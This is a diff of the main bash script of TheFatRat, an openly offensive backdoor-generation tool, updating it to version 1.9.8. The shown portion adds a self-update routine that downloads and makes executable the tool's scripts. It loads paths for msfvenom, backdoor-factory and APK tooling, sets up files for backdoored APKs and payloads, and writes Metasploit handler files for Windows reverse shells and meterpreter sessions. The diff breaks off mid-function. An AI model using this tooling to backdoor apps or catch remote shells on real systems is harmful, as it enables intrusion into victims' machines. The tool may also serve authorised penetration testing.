@@ -1,24 +1,25 @@
 #!/usr/bin/env bash
 
-###########################################################################################
-#	  										  #
-#											  #
-#	  THEFATRAT-1.9.6					  			  #	
-#											  #
-#	  Welcome and dont disclaimer							  #
-#	  TheFatRat Author By Edo -maland- { screetec }					  #
-#	  Tested On , Backbox , kali Linux and Kali sana v.2				  #
-#	  contact me in screetsec@gmail.com or screetsec@dracos-linux.org		  #
-#	  Distro Penetration From Indonesia : https://dracos-linux.org/			  #
-#	  										  #
-#	  www.github.com/screetsec	   						  #
-#											  #
-############################################################################################
+#-Metadata----------------------------------------------------#
+#  Filename: TheFatRat(v1.9.8#dev)       (Update: 2022-01-27) #
+#-Info--------------------------------------------------------#
+#  TheFatRat - A Massive Exploiting Tool                      #
+#-Author(s)---------------------------------------------------#
+#  Edo maland ~ @screetsec                                    #
+#-Operating System--------------------------------------------#
+#  Designed for & tested on: Linux 	                      #
+#  Reported working : Ubuntu 16                               #
+#	   	    : Parrot 				      #
+#	   	    : BlackArch				      #
+#                   : Kali Linux 			      #
+#		    : Backbox     			      #
+#  Available on BlackArch Linux                               #
+#-Licence-----------------------------------------------------#
+#  GNU General Public License v3.0                            #
+#-------------------------------------------------------------#
 
 
-
-#WARNA KESUKAAN
-
+#COLOUR
 cyan='\e[0;36m'
 green='\e[0;34m'
 okegreen='\033[92m'
@@ -34,62 +35,144 @@ orange='\e[38;5;166m'
 lnx="Linux"
 lsb_release -i > temp/distro.tmp
 lsb_release -c > temp/codename.tmp
-rlname=`awk '{print $2}' temp/codename.tmp`
-dist=`awk '{print $3}' temp/distro.tmp`
-dist1=`awk '{print $4}' temp/distro.tmp`
+rlname=$(awk '{print $2}' temp/codename.tmp)
+dist=$(awk '{print $3}' temp/distro.tmp)
+dist1=$(awk '{print $4}' temp/distro.tmp)
 rm -f temp/codename.tmp >/dev/null
 rm -f temp/distro.tmp >/dev/null
-if [ "$dist" == "$lnx" ];
-then
-dist0=$dist1
-else
-dist0=$dist
+
+if [[ "$dist" == "$lnx" ]]; then
+	dist0="$dist1"
+   else
+	dist0="$dist"
 fi
 
-#SAMARAN TAMPAN
-#Variables
-path=`pwd`
-Versi=1.9.6
-codename=Whistle
-OS=`uname` #
-distro=$dist0
-disrov=$rlname
+#VARIABLE
+path=$(pwd)
+
+if [[ -f "${path}/release" ]]; then
+	Versi=$(sed -n 1p < "$path/release")
+   else
+	echo ""
+	echo -e "$red""* - Version Control File Not Found"
+	echo ""
+	echo -ne "$okegreen""* - Updating FatRat Main Files ....."
+	
+# Cleaning Old Version
+	rm -f "${path}/fatrat" >/dev/null 2>&1
+	rm -f "${path}/setup.sh" >/dev/null 2>&1
+	rm -f "${path}/grab.sh" >/dev/null 2>&1
+	rm -f "${path}/update" >/dev/null 2>&1
+	rm -f "${path}/backdoor_apk" >/dev/null 2>&1
+	
+# Getting New Files on Repositoy The FatRat
+	wget https://raw.githubusercontent.com/Screetsec/TheFatRat/master/fatrat -O "${path}/fatrat" >/dev/null 2>&1
+	wget https://raw.githubusercontent.com/Screetsec/TheFatRat/master/setup.sh -O "${path}/setup.sh" >/dev/null 2>&1
+	wget https://raw.githubusercontent.com/Screetsec/TheFatRat/master/grab.sh -O "${path}/grab.sh" >/dev/null 2>&1
+	wget https://raw.githubusercontent.com/Screetsec/TheFatRat/master/update -O "${path}/update" >/dev/null 2>&1
+	wget https://raw.githubusercontent.com/Screetsec/TheFatRat/master/release -O "${path}/release" >/dev/null 2>&1
+	wget https://raw.githubusercontent.com/Screetsec/TheFatRat/master/backdoor_apk -O "${path}/backdoor_apk" >/dev/null 2>&1
+
+# Give Permssion To New Files
+	chmod +x "${path}/fatrat" >/dev/null 2>&1
+	chmod +x "${path}/setup.sh" >/dev/null 2>&1
+	chmod +x "${path}/grab.sh" >/dev/null 2>&1
+	chmod +x "${path}/update" >/dev/null 2>&1
+	chmod +x "${path}/backdoor_apk" >/dev/null 2>&1
+	echo "Done"
+	sleep 3
+	echo ""
+	echo -e "$orange""Restart fatrat"
+   exit 1
+fi
+
+# Create Safe Measures For Old Versions
+lstdir="${path}/output"
+aplst="$path/backdoored"
+
+if [[ -d "${lstdir}" ]]; then
+	cp "$lstdir/*" "$output/" >/dev/null 2>&1
+	rm -rf "$lstdir" >/dev/null 2>&1
+	
+if [[ -d "${aplst}" ]]; then
+	cp "$aplst/*" "$output/" >/dev/null 2>&1
+	rm -rf "$aplst" >/dev/null 2>&1
+fi
+
+	echo -e "$okegreen""All your old generated files in fatrat are now located in :"
+	echo -e "$orange""$output"
+	echo ""
+		rm "$path/config/config.path"  >/dev/null 2>&1
+	echo ""
+	echo "Setup for fatrat must run again due to version upgrades"
+	read -rsp $'Press [ENTER] key to Continue\n' -n 1 key
+./setup.sh
+  exit 0
+fi
+file="config/config.path"
+#Check If Tools Path Config File Exists Before Proceeding
+#Config File Exists, Then Load Tools Paths To Specific Variables
+if [ -f "${file}" ]; then
+	msfconsole=$(sed -n 13p ${file})
+	msfvenom=$(sed -n 14p ${file})
+	backdoor=$(sed -n 15p ${file})
+	searchsploit=$(sed -n 16p ${file})
+	aapt=$(sed -n 10p ${file})
+	apktool=$(sed -n 11p ${file})
+	keytool=$(sed -n 7p ${file})
+	sign=$(sed -n 5p ${file})
+	dx=$(sed -n 9p ${file})
+	baksmali=$(sed -n 12p ${file})
+	output=$(sed -n 17p ${file})
+else
+
+#Config File Does Not Exist
+	echo -e $red"Configuration file does not exists, run setup.sh first for config ."
+   exit 1
+fi
+
+# VARIABLE GLOBAL
+codename=Target
+OS=$(uname) # Detect Distro
+distro="$dist0"
+disrov="$rlname"
 SERVICE=service;
 apkembed='tools/apkembed.rb' # exec script path
-pwned='python tools/pw_exec.py'
-dave='python tools/trusted_2_6.py'
+pwned='python2 tools/pw_exec.py'
+dave='python2 tools/trusted_2_6.py'
 B='tools/prog.cs'
 C='tools/dad.c'
 apache='tools/apache.c'
-paycom='output/payload.c'
-pdfcom='output/pdf.c'
-bcom='output/Program.cs'
-pdfcom='output/pdf.c'
+paycom="${output}/payload.c"
+pdfcom="${output}/pdf.c"
+bcom="${output}/Program.cs"
+pdfcom="${output}/pdf.c"
 pstager='tools/power.py'
-apachecom='output/apache_com.c'
-out='output/ip.txt'
+apachecom="${output}/apache_com.c"
+out="${output}/ip.txt"
 pump='tools/pump.py'
 dllcustom='temp/dll_cus.c'
 reverse1='temp/reverse1.c'
 stag='temp/stag.c'
-apkconfig=$path/config/apk.tmp
+apkconfig="${path}/config/apk.tmp"
 unzip=unzip
-temp=$path/temp
-file="config/config.path"
+temp="${path}/temp"
 grab="config/grab.conf"
-meterp="$path/temp/meterpreter.rc"
+meterp="${path}/temp/meterpreter.rc"
 outf="app_backdoor.apk"
-msploit=$path/logs/msploit.log
-lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
-lanip6=`ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
-publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
-hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
-list=$path/config/listeners
-log=$path/logs/apk-old.log
-pwind=$path/logs/pwind.log
-defcon=$path/config/conf.def
-logfud=$path/logs/fudwin.log
-# spinner for Metasploit Generator
+msploit="${path}/logs/msploit.log"
+lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
+lanip6=$(ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
+publicip=$(dig +short myip.opendns.com @resolver1.opendns.com)
+hostn=$(host "$publicip" | awk '{print $5}' | sed 's/.$//')
+list="${path}/config/listeners"
+log="${path}/logs/apk-old.log"
+pwind="${path}/logs/pwind.log"
+defcon="${path}/config/conf.def"
+logfud="${path}/logs/fudwin.log"
+
+
+# Spinner for Metasploit Generator
 spinlong ()
 {
     echo -e "\n"
@@ -105,7 +188,7 @@ spinlong ()
 }
 
 
-# spinner for random seed generator
+# Spinner For Random Seed Generator
 spinlong2 ()
 {
     echo -e "\n"
@@ -119,274 +202,278 @@ spinlong2 ()
         sleep 0.02
     done
 }
+
 # Check if configuration file for grab script exists in /config folder
 # Case grab config does not exist then create a default config with 60 seconds
-if [ ! -f $grab ]
-then
-echo "------------------------------------------------------------" > $grab
-echo "| Timeout configuration for Msfconsole file Grabber Script |" >> $grab
-echo "------------------------------------------------------------" >> $grab
-echo "60" >> $grab
+
+if [[ ! -f "$grab" ]]; then
+	echo "------------------------------------------------------------" > "$grab"
+	echo "| Timeout configuration for Msfconsole file Grabber Script |" >> "$grab"
+	echo "------------------------------------------------------------" >> "$grab"
+	echo "60" >> "$grab"
 fi
 
 # Default Local Host & Port file creation function
 function confdefault () {
 clear
-confd=$path/config/conf.def
-if [ -f "$confd" ]
-then
+confd="$path/config/conf.def"
+lh=$(sed -n 1p "$confd")
+lp=$(sed -n 2p "$confd")
+
+if [[ -f "$confd" ]]; then
 clear
-echo -e $okegreen " "
-echo "Fatrat detected that exists a default config file
-with the following values :"
-echo ""
-lh=`sed -n 1p $confd`
-lp=`sed -n 2p $confd`
-echo "LHOST : $lh "
-echo "LPORT : $lp "
-echo ""
-read -rsp $'Press [ENTER] key go to options menu \n' -n 1 key
-echo ""
-echo -e $okegreen "Select one of the options bellow"
-echo ""
-echo -e $orange "+---------------------------------+"
-echo -e $orange "|$white [$okegreen 1$white ]$yellow Change current config$orange     |"
-echo -e $orange "|$white [$okegreen 2$white ]$yellow Delete configuration file$orange |"
-echo -e $orange "|$white [$okegreen 3$white ]$yellow Cancel$orange                    |"
-echo -e $orange "+---------------------------------+"
-echo ""
-echo -ne $okegreen "Option : ";tput sgr0
-read con
-echo ""
-case $con in
+	echo -e "$okegreen"" "
+	echo "Fatrat detected that exists a default config file
+	with the following values :"
+	echo ""
+	echo "LHOST : $lh "
+	echo "LPORT : $lp "
+	echo ""
+	read -rsp $'Press [ENTER] key go to options menu \n' -n 1 key
+	echo ""
+	echo -e "$okegreen" "Select one of the options bellow"
+	echo ""
+	echo -e "$orange" "+---------------------------------+"
+	echo -e "$orange" "|$white [$okegreen 1$white ]$yellow Change current config$orange     |"
+	echo -e "$orange" "|$white [$okegreen 2$white ]$yellow Delete configuration file$orange |"
+	echo -e "$orange" "|$white [$okegreen 3$white ]$yellow Cancel$orange                    |"
+	echo -e "$orange" "+---------------------------------+"
+	echo ""
+	echo -ne "$okegreen" "Option : ";tput sgr0
+	read con
+	echo ""
+case "$con" in
 
 1)
-confd=$path/config/conf.def
-rm -rf $confd
-touch $confd
-clear
-echo ""
-echo -e $okegreen "Write Lhost value$yellow (ex: 192.168.1.1 or mydomain.com)"
-echo -ne $okegreen "LHOST : ";tput sgr0
-read val
-if [ -z $val ]
-then
-confdefault
-else
-echo $val > $confd
-fi
-echo ""
-echo -e $okegreen "Write Lport value$yellow (Must be a port between 1 & 65535)"
-echo -ne "LPORT : ";tput sgr0
-read val
-if [ -z $val ]
-then
-confdefault
-else
-echo $val >> $confd
-fi
-echo -e $okegreen ""
-read -rsp $'Configuration created , restart fatrat , Press [ENTER] key to exit fatrat \n' -n 1 key
-clear
+confd="$path/config/conf.def"
+	rm -rf "$confd"
+	touch "$confd"
+	clear
+	echo ""
+	echo -e "$okegreen" "Write Lhost value$yellow (ex: 192.168.1.1 or mydomain.com)"
+	echo -ne "$okegreen" "LHOST : ";tput sgr0
+	read val
+	if [[ -z "$val" ]]
+		then
+			confdefault
+		else
+			echo "$val" > "$confd"
+	fi
+			echo ""
+			echo -e "$okegreen" "Write Lport value$yellow (Must be a port between 1 & 65535)"
+			echo -ne "LPORT : ";tput sgr0
+			read val
+	if [[ -z "$val" ]]; then
+			confdefault
+		else
+			echo "$val" >> "$confd"
+	fi
+	
+	echo -e "$okegreen" ""
+	read -rsp $'Configuration created , restart fatrat , Press [ENTER] key to exit fatrat \n' -n 1 key
+	clear
+	
 exit 0
-
 ;;
+
 2)
-clear
-echo -e $okegreen ""
-rm -rf $confd
-echo "Default configuration file was deleted , you will now have
-to input Lhost & Lport values manually in fatrat options ."
-echo ""
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-clear
-menu
+	clear
+	echo -e "$okegreen" ""
+	rm -rf "$confd"
+	echo "Default configuration file was deleted , you will now have
+	to input Lhost & Lport values manually in fatrat options ."
+	echo ""
+	read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+	clear
+	menu
 
 ;;
 
 3)
-clear
-menu
+	clear
+	menu
 
 ;;
-esac
+   esac
 
 else
-echo -e $okegreen ""
-echo "No default configuration file detected "
-read -rsp $'Press [ENTER] key to go to options \n' -n 1 key
-echo ""
-clear
-echo -e $okegreen "Select one of the options bellow"
-echo ""
-echo -e $orange "+---------------------+"
-echo -e $orange "|$white [$okegreen 1$white ]$yellow Create config$orange |"
-echo -e $orange "|$white [$okegreen 2$white ]$yellow Cancel$orange        |"
-echo -e $orange "+---------------------+"
-echo ""
-echo -ne $okegreen "Option : ";tput sgr0
-read con
-echo ""
-case $con in
+	echo -e "$okegreen" ""
+	echo "No default configuration file detected "
+	read -rsp $'Press [ENTER] key to go to options \n' -n 1 key
+	echo ""
+	clear
+	echo -e "$okegreen" "Select one of the options bellow"
+	echo ""
+	echo -e "$orange" "+---------------------+"
+	echo -e "$orange" "|$white [$okegreen 1$white ]$yellow Create config$orange |"
+	echo -e "$orange" "|$white [$okegreen 2$white ]$yellow Cancel$orange        |"
+	echo -e "$orange" "+---------------------+"
+	echo ""
+	echo -ne "$okegreen" "Option : ";tput sgr0
+	read -r con
+	echo ""
+case "$con" in
 1)
-confd=$path/config/conf.def
-touch $confd
-echo ""
-echo -e $okegreen "Write Lhost value$yellow (ex: 192.168.1.1 or mydomain.com)"
-echo -ne $okegreen "LHOST : ";tput sgr0
-read val
-if [ -z $val ]
-then
-confdefault
-else
-echo $val > $confd
-fi
-echo ""
-echo -e $okegreen "Write Lport value$yellow (Must be a port between 1 & 65535)"
-echo -ne "LPORT : ";tput sgr0
-read val
-if [ -z $val ]
-then
-confdefault
-else
-echo $val >> $confd
-fi
-echo -e $okegreen ""
-read -rsp $'Configuration created , restart fatrat , Press [ENTER] key to exit fatrat \n' -n 1 key
-clear
+confd="$path/config/conf.def"
+	touch "$confd"
+	echo ""
+	echo -e "$okegreen" "Write Lhost value$yellow (ex: 192.168.1.1 or mydomain.com)"
+	echo -ne "$okegreen" "LHOST : ";tput sgr0
+	read -r val
+	if [[ -z "$val" ]]; then
+		confdefault
+	else
+		echo "$val" > "$confd"
+	fi
+		echo ""
+		echo -e "$okegreen" "Write Lport value$yellow (Must be a port between 1 & 65535)"
+		echo -ne "LPORT : ";tput sgr0
+		read -r val
+	if [[ -z "$val" ]]; then
+		confdefault
+	else
+		echo "$val" >> "$confd"
+	fi
+		echo -e "$okegreen" ""
+		read -rsp $'Configuration created , restart fatrat , Press [ENTER] key to exit fatrat \n' -n 1 key
+		clear
 exit 0
 ;;
+
 2)
-clear
-menu
+	clear
+	menu
 ;;
 *)
-echo -e $red ""
-read -rsp $ "Invalid Option"
-confdefault
+	echo -e "$red" ""
+	read -rsp $ "Invalid Option"
+	confdefault
 ;;
-esac
+   esac
 fi
 }
-# Verify user input values on manual Lhost , Lport & filename
-function invalid ()
-{
+
+# Verify user Input Values on Manual LHOST, LPORT & FILENAME
+function invalid (){
 err=0
 echo ""
-if [ -z "$yourip" ]; then
-echo -e $red ""
-echo "[ ! ] You must write an IP or Hostname ."
-echo -e $okegreen ""
-echo "IP Example : 192.168.1.34
-Domain Example : myhost.com"
-err=1
+
+if [[ -z "$yourip" ]]; then
+	echo -e "$red" ""
+	echo "[ ! ] You must write an IP or Hostname ."
+	echo -e "$okegreen" ""
+	echo "IP Example : 192.168.1.34
+	Domain Example : myhost.com"
+	err=1
 fi
-echo ""
-if [ -z "$yourport" ]; then
-echo -e $red ""
-echo "[ ! ] You must write a port number between 1 & 65535 ."
-err=1
+	echo ""
+if [[ -z "$yourport" ]]; then
+	echo -e "$red" ""
+	echo "[ ! ] You must write a port number between 1 & 65535 ."
+	err=1
 fi
-if [ -z "$fira" ]; then
-echo -e $red ""
-echo "[ ! ] You must write a filename ."
-echo -e $okegreen ""
-echo "Filename Example : myfile"
-err=1
+
+if [[ -z "$fira" ]]; then
+	echo -e "$red" ""
+	echo "[ ! ] You must write a filename ."
+	echo -e "$okegreen" ""
+	echo "Filename Example : myfile"
+	err=1
 fi
-echo -e $okegreen ""
+echo -e "$okegreen" ""
 }
+
 #Selection of Executable and verify if exists for backdoor-factory
-function selexe() {
+function selexe(){
 echo ""
           echo -e $okegreen "Enter the path to your EXE file .(ex: /root/downloads/myfile.exe)"
           echo ""
           echo -ne $cyan "Path : ";tput sgr0
-          read exef
-if [ ! -f $exef ]
-then
-echo ""
-echo -e $red "File does not exist , make sure you write the right path of it ."
-echo ""
-echo -e $okegreen "Press [ENTER] key to try again ."
-read cont
-selexe
-fi
+          read -r exef
+		if [[ ! -f "$exef" ]]
+			then
+				echo ""
+				echo -e "$red" "File does not exist , make sure you write the right path of it ."
+				echo ""
+				echo -e "$okegreen" "Press [ENTER] key to try again ."
+				read -r cont
+				selexe
+		fi
 }
-#Apk embeded file selection and verify if user path is correct
-function selapk() {
+
+#Apk Embeded File Selection and Verify if User Path Is Correct
+function selapk(){
 echo ""
           echo -e $okegreen "Enter the path to your android app/game .(ex: /root/downloads/myapp.apk)"
           echo ""
           echo -ne $cyan "Path : ";tput sgr0
           read exef
-if [ ! -f $exef ]
-then
-echo ""
-echo -e $red "File does not exist , make sure you write the right path of it ."
-echo ""
-echo -e $okegreen "Press [ENTER] key to try again ."
-read cont
-selapk
-fi
+		if [ ! -f $exef ]
+			then
+				echo ""
+				echo -e $red "File does not exist , make sure you write the right path of it ."
+				echo ""
+				echo -e $okegreen "Press [ENTER] key to try again ."
+				read cont
+				selapk
+		fi
 }
 
-#debian embeded file selection and verify if user path is correct
-function seldeb() {
+#Debian Embeded File Selection and Verify if User Path is Correct
+function seldeb(){
 echo ""
           echo -e $okegreen "Enter the path to your deb file .(ex: /root/downloads/dirbuster.deb)"
           echo ""
           echo -ne $cyan "Path : ";tput sgr0
           read exef
-if [ ! -f $exef ]
-then
-echo ""
-echo -e $red "File does not exist , make sure you write the right path of it ."
-echo ""
-echo -e $okegreen "Press [ENTER] key to try again ."
-read cont
-seldeb
-fi
+		if [ ! -f $exef ]
+			then
+				echo ""
+				echo -e $red "File does not exist , make sure you write the right path of it ."
+				echo ""
+				echo -e $okegreen "Press [ENTER] key to try again ."
+				read cont
+				seldeb
+		fi
 }
 
-#Verification of user input for Lhost & Lport Only
-function invalid1 ()
-{
+#Verification of User input for Lhost & Lport Only
+function invalid1(){
 err=0
 echo ""
 if [ -z "$yourip" ]; then
-echo -e $red ""
-echo "[ ! ] You must write an IP or Hostname ."
-echo -e $okegreen ""
-echo "IP Example : 192.168.1.34
-Domain Example : myhost.com"
-err=1
+	echo -e $red ""
+	echo "[ ! ] You must write an IP or Hostname ."
+	echo -e $okegreen ""
+	echo "IP Example : 192.168.1.34
+	Domain Example : myhost.com"
+	err=1
 fi
-echo ""
+
+	echo ""
 if [ -z "$yourport" ]; then
-echo -e $red ""
-echo "[ ! ] You must write a port number between 1 & 65535 ."
-err=1
+	echo -e $red ""
+	echo "[ ! ] You must write a port number between 1 & 65535 ."
+	err=1
 fi
-echo -e $okegreen ""
+	echo -e $okegreen ""
 }
 
-# Verify if user ip input is valid
-#this function is not active yet because user may input an hostame
-valid_ip()
-{
 
+# This function is not active yet because user may input an hostame
+
+valid_ip(){
+# Verify if user ip input is valid
 if [[ $yourip =~ ^[0-255]+\.[0-255]+\.[0-255]+\.[0-255]+$ ]]; then
   echo ""
-  err=1
+  	err=1
 else
-  err=0
+  	err=0
 fi
 }
 
-#for checking if your command is correct
-gboor ()
-{
+#Checking if your Command is correct
+gboor(){
 echo -e $yellow ""
 cat << !
   Generate Backdoor
@@ -403,9 +490,8 @@ cat << !
 !
 }
 
-#for checking if your command is correct when embed backdoor
-gboor2 ()
-{
+#Checking if your Command is Correct when embed backdoor
+gboor2(){
 echo -e $ ""
 cat << !
   Generate Backdoor
@@ -421,730 +507,766 @@ cat << !
 
 !
 }
-function bkflst () {
-echo -e $okegreen "Do you want to create a listener for this configuration"
-echo -e $okegreen "to use in msfconsole in future ?"
-echo ""
-echo -ne $cyan "Choose y/n : "
-read sel
-case $sel in
-y|Y|Yes|yes|YES)
-echo ""
-echo -e $green "Write the name for this config . (ex : back-lst)"
-echo -ne "Filename : ";tput sgr0
-read fname
-if [ -z $fname ]
-then
-svf=$path/config/listeners/back-lst.rc
-rm -rf $svf >/dev/null 2>&1
-echo ""
-echo -e $orange "  +-------------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
-echo -e $orange "  +-------------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload :";tput sgr0
-read pld
-if [ $pld == "1" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/back-lst.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "2" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/back-lst.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "3" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/back-lst.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "4" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/back-lst.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "5" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/back-lst.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "6" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/back-lst.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-else
-echo -e $red "Invalid option"
-echo ""
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-bkflst
-fi
-else
-svf=$path/config/listeners/$fname.rc
-rm -rf $fname >/dev/null 2>&1
-echo ""
-echo -e $orange "  +-------------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
-echo -e $orange "  +-------------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload :";tput sgr0
-read pld
-if [ $pld == "1" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "2" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "3" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "4" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "5" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-elif [ $pld == "6" ]
-then
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-else
-echo -e $red "Invalid option"
-echo ""
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-bkflst
-fi
-fi
-;;
-n|no|No|NO)
-echo -e $okegreen ""
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-;;
-*)
-clear
-menu
-;;
-esac
+
+function bkflst(){
+	echo -e $okegreen "Do you want to create a listener for this configuration"
+	echo -e $okegreen "to use in msfconsole in future ?"
+	echo ""
+	echo -ne $cyan "Choose y/n : "
+	read sel
+		case $sel in
+		y|Y|Yes|yes|YES)
+			echo ""
+			echo -e $green "Write the name for this config . (ex : back-lst)"
+			echo -ne "Filename : ";tput sgr0
+			read fname
+				if [ -z $fname ]; then
+				   svf=$path/config/listeners/back-lst.rc
+				    rm -rf $svf >/dev/null 2>&1
+					echo ""
+					echo -e $orange "  +-------------------------------------------+"
+					echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
+					echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
+					echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
+					echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
+					echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
+					echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
+					echo -e $orange "  +-------------------------------------------+"
+					echo ""
+					echo -ne $okegreen "  Choose Payload :";tput sgr0
+					read pld
+						if [ $pld == "1" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/back-lst.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "2" ]; then
+							echo "use exploit/multi/handler" > $svf
